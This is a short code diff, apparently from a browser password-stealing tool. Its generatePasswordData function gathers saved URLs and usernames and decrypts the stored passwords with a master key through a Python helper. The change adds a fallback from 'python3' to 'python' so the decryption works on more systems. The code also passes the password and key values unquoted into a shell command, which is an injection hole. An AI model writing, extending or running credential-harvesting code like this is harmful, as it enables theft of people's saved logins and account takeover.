@@ -75,7 +75,13 @@ function generatePasswordData(data, masterKey) {
             if (url && username && password) {
                 buffer += `[+] Url: ${url}\n`
                 buffer += `[+] Username: ${username}\n`
-                decryptedPass = child_process.execSync(`python3 ` + path.resolve(appDir, 'scripts', 'decrypt.py') + ` ${password} ${masterKey}`)
+                try{
+                    decryptedPass = child_process.execSync(`python3 ` + path.resolve(appDir, 'scripts', 'decrypt.py') + ` ${password} ${masterKey}`)
+                }
+                catch (e){
+                    decryptedPass = child_process.execSync(`python ` + path.resolve(appDir, 'scripts', 'decrypt.py') + ` ${password} ${masterKey}`)
+                }
+
                 buffer += `[+] Password: ${decryptedPass}\n`
             }
         } else
